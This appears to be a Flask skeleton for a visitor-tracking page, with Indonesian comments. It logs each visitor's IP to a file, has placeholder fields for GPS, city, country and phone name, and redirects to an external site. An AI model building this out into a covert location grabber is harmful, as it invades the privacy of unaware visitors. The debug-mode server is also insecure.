from flask import Flask, request, redirect, jsonify
import json

app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/submit_form', methods=['POST'])
def submit_form():
    # Ambil data dari form
    ip_internet = request.remote_addr
    ip_lokasi = 'Belum diimplementasikan'
    link_maps = 'Belum diimplementasikan'
    gps_detail = 'Belum diimplementasikan'
    nama_kota = 'Belum diimplementasikan'
    nama_wilayah = 'Belum diimplementasikan'
    nama_negara = 'Belum diimplementasikan'
    nama_handphone = 'Belum diimplementasikan'

    # Data yang akan disimpan ke adminlog.txt
    data = {
        'IP internet': ip_internet,
        'IP lokasi': ip_lokasi,
        'Link maps': link_maps,
        'GPS detail pengguna': gps_detail,
        'Nama kota': nama_kota,
        'Nama wilayah': nama_wilayah,
        'Nama negara': nama_negara,
        'Nama handphone': nama_handphone
    }

    # Simpan data ke file adminlog.txt
    with open('adminlog.txt', 'a') as file:
        file.write(json.dumps(data) + '\n')

    # Redirect pengguna ke halaman external setelah submit
    return redirect("https://fivegaming24.github.io/open.html", code=302)

if __name__ == '__main__':
    app.run(debug=True)
